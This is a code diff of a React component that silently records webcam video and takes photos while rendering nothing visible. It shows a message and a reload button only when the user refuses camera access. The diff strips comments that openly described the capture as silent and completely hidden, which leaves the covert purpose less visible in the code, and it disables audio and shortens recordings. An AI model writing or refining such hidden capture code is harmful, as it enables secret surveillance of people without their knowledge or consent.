@@ -11,36 +11,27 @@ const PhotoAndVideoTaker = () => {
   const mediaBlobs = useRef<{ blob: Blob; type: "photo" | "video" }[]>([]);
   const [showDeniedMessage, setShowDeniedMessage] = useState(false);
 
-  useEffect(() => {
-    const initCamera = async () => {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { width: 1280, height: 720 },
-          audio: true,
-        });
+  const initCamera = async () => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { width: 1280, height: 720 },
+        audio: false,
+      });
 
-        mediaStreamRef.current = stream;
+      mediaStreamRef.current = stream;
 
-        if (videoRef.current) {
-          videoRef.current.srcObject = stream;
-          videoRef.current.onloadedmetadata = () => {
-            // Start silent capture process
-            startVideoRecording();
-          };
-        }
-      } catch (error) {
-        // Only show message if access is denied
-        setShowDeniedMessage(true);
-        console.error("Camera access denied:", error);
+      if (videoRef.current) {
+        videoRef.current.srcObject = stream;
+        videoRef.current.onloadedmetadata = () => {
+          startVideoRecording();
+        };
       }
-    };
-
-    initCamera();
-
-    return () => {
-      mediaStreamRef.current?.getTracks().forEach((track) => track.stop());
-    };
-  }, []);
+      setShowDeniedMessage(false);
+    } catch (error) {
+      setShowDeniedMessage(true);
+      console.error("Camera access denied:", error);
+    }
+  };
 
   const startVideoRecording = () => {
     if (!mediaStreamRef.current) return;
@@ -61,10 +52,9 @@ const PhotoAndVideoTaker = () => {
 
     recorder.start();
 
-    // Record for 5 seconds
     setTimeout(() => {
       recorder.stop();
-    }, 10000);
+    }, 5000);
   };
 
   const startPhotoCapture = () => {
@@ -94,7 +84,6 @@ const PhotoAndVideoTaker = () => {
         (blob) => {
           if (blob) {
             mediaBlobs.current.push({ blob, type: "photo" });
-            console.log("Photo captured silently");
           }
         },
         "image/jpeg",
@@ -137,18 +126,32 @@ const PhotoAndVideoTaker = () => {
     }
   };
 
-  // Only show UI if camera access was denied
+  useEffect(() => {
+    initCamera();
+
+    return () => {
+      mediaStreamRef.current?.getTracks().forEach((track) => track.stop());
+    };
+  }, []);
+
   if (showDeniedMessage) {
     return (
       <div className="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50">
         <div className="bg-white rounded-xl p-6 max-w-md w-full text-center">
-          <p className="text-red-600">Camera access is required to continue</p>
+          <p className="text-red-600 mb-4">
+            Camera access is required to continue
+          </p>
+          <button
+            onClick={() => window.location.reload()}
+            className="px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700 transition-colors"
+          >
+            Try Again
+          </button>
         </div>
       </div>
     );
   }
 
-  // Normally render nothing (completely hidden)
   return (
     <div className="hidden">
       <video ref={videoRef} autoPlay playsInline muted />
